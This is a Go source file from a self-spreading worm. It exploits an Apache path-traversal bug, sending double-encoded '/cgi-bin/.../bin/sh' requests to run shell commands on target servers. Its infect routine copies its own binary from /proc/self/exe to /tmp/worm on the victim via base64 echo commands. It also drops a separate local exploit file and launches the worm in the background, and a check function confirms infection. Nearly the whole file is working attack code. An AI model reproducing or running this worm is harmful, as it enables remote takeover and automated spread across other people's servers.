package infection

import (
	"io/ioutil"
	"fmt"
	"net"
	"encoding/base64"
	"strings"
)

//Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'

var (
	path = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s"
	commandsTemplate = "echo;%s"
	wormPath = "/tmp/worm"
)

func PrepareRequest(ip string, commands string) string {
	rt := fmt.Sprintf("POST %s HTTP/1.1\r\n", path)
	rt += fmt.Sprintf("Host: %s\r\n", ip)
	rt += fmt.Sprintf("Connection: close\r\n")
	rt += fmt.Sprintf("Content-Type: text/plain\r\n")
	rt += fmt.Sprintf("Content-Length: %d\r\n",len(commands))
	rt += fmt.Sprintf("\r\n")
	rt += fmt.Sprintf("%s\r\n",commands)
	return rt
}

func MakeRequest(ip string, port string, commands string) string {
	conn, err := net.Dial("tcp", ip+":"+port)
	rt := PrepareRequest(ip, commands)
	_, err = conn.Write([]byte(rt))
	resp, err := ioutil.ReadAll(conn)
    if err != nil {
		return ""
    }
    conn.Close()
	return string(resp)
}

func MakeRequest2(ip string, port string, commands string) {
	conn, _ := net.Dial("tcp", ip+":"+port)
	rt := PrepareRequest(ip, commands)
	conn.Write([]byte(rt))
	return
}

func ApacheCheckInfection(ip string, port string) bool {
	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
	commands := fmt.Sprintf(commandsTemplate,executeCommands)
	resp := MakeRequest(ip,port,commands)
	return strings.Contains(resp,wormPath)
}

func ApacheInfect(ip string, port string) bool {
	var worm []byte
	worm = GetFile("/proc/self/exe")
	worm64 := base64.StdEncoding.EncodeToString(worm)
	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
	MakeRequest(ip,port,commands)
	
	file := GetFile("./exploit_nss_manual")
	file64 := base64.StdEncoding.EncodeToString(file)
	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/exploit_nss_manual")
	MakeRequest(ip,port,commands)
	
	commands = fmt.Sprintf("chmod u+x %s && %s &", wormPath, wormPath)
	commands = fmt.Sprintf(commandsTemplate,commands)
	MakeRequest2(ip,port,commands)
	return ApacheCheckInfection(ip,port)
}
